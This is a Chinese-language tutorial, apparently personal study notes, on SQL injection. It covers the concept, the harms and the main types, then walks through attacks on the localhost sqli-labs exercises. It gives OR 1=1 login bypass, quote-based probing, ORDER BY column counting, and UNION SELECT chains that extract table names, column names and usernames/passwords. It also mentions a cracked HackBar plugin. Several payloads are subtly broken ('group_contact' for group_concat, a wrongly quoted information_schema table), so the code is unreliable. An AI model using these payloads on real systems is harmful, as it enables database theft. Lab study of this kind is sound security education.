一. Sql注入原理
1. 介绍SQL注入
SQL注入就是指web应用程序对用户输入数据的合法性没有判断,前端传入后端的参数是攻 击者可控的,并且参数代入数据库查询,攻击者可以通过构造不同的SQL语句来实现对数据库 任意操作

SQL注入漏洞的产生需要满足两个条件
    参数用户可控
    参数带入数据库查询,传入的参数拼接到SQL语句,并且带入数据库查询

2. SQL注入的危害
    1.数据库敏感信息泄露
    2.页面被窜改
    3.数据库被恶意操作
    4.服务器被远程控制

3. SQL注入的分类
根据注入位置数据类型可将SQL注入分为两类:数字型和字符串型
    1.字符串注入:
    SELECT * FROM users WHERE username = '' AND 'password' = '';
    SELECT * FROM users WHERE username = 'admin' OR 1=1 -- ' AND 'password' = '';
    SELECT * FROM users WHERE TRUE;
    2.数字注入:
    SELECT * FROM users WHERE id =1;
    SELECT * FROM users WHERE id =-1 OR 1=1;
根据返回结果可以分为
    3.显错注入(error-based) 显示错误信息
    4.盲注(boolean/time-based blind)
4. SQL注入的形成原因
SQL注入的形成原因
    1.数据与代码未严格分离
    2.用户提交的参数数据未做充分检查过滤及被带入到SQL命令中,改变了原有SQL命令的'语 义' ,且成功被数据库执行

SQL注入过程
    客户端参数值等数据被修改
    服务端未经检查和过滤即将被修改的数据注入到SQL命令中，SQL命令功能被修改
    数据库引擎执行被修改后的SQL命令
    服务端将注入的结果返回给客户端
    客户端根据上一次注入获取到的敏感信息构造注入语句进行进一步注入

火狐浏览器插件安装
hackbar破解安装

二. sql注入
1.GET和POST请求
GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL 和传输数据，多个参数用&连接
POST提交：把提交的数据放置在是HTTP包的包体中。
因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变

2. get基于报错的SQL注入
通过url中修改对应的ID值,为正常数字、字符(单引号,双引号,括号)、反斜线来探测url中是 否存在注入点

发现注入点
eg1. 报错 http://127.0.0.1/sqli/Less-1/?id=1'
error: ' '1'' LIMIT 0,1 '
链接输入信息: ?id=1'
select * from xxx where id = limit 0, 1

eg2. http://127.0.0.1/sqli/Less-2/?id=1'
error: '' LIMIT 0,1' or ' "LIMIT 0,1'
input: ?id=1' or ?id=1"
select * from xxx where id = "1" limit 0,1;

eg3.http://127.0.0.1/sqli/Less-3/?id=1'
error: ''1'') LIMIT 0,1'
input: ?id=1'
select * from xxx where id = ('1' ') limit 0,1;

eg4.http://127.0.0.1/sqli/Less-4/?id=1"
error: '"1"') LIMIT 0,1'
select * from xxx where id = ("1") limit 0,1;

3. get基于报错的SQL注入利用
    1.order by判断字段数(排序) ASC正序 DESC倒序
    SELECT * FROM users ORDER BY id;
    SELECT * FROM users ORDER BY username;
    SELECT * FROM users ORDER BY 1;     # 表里第一列
    http://127.0.0.1/sqli/Less-1/?id=1'order by 1--+
    http://127.0.0.1/sqli/Less-1/?id=1'order by 4--+        # 报错，说明列表只有三列字段

    2.利用union select联合查询,获取表名
    127.0.0.1/sqli/Less-1/?id=0' union select 1,2,3 --+
    127.0.0.1/sqli/Less-1/?id=0' union select 1,user(),database() --+
    127.0.0.1/sqli/Less-1/?id=0' union select 1,version(),database() --+
    127.0.0.1/sqli/Less-1/?id=0' union select 1,group_contact(table_name),3 from information_schema.'tables' where table_schema=database() --+

    3.利用union select联合查询,获取字段名
    127.0.0.1/sqli/Less-1/?id=0' union select 1,group_contact(column_name),3 from information_schema.'COLUMNS' where table_name='users' --+

    4.利用union select联合查询,获取字段值
    127.0.0.1/sqli/Less-1/?id=0' union select 1,group_contact(username, password),3 from users --+


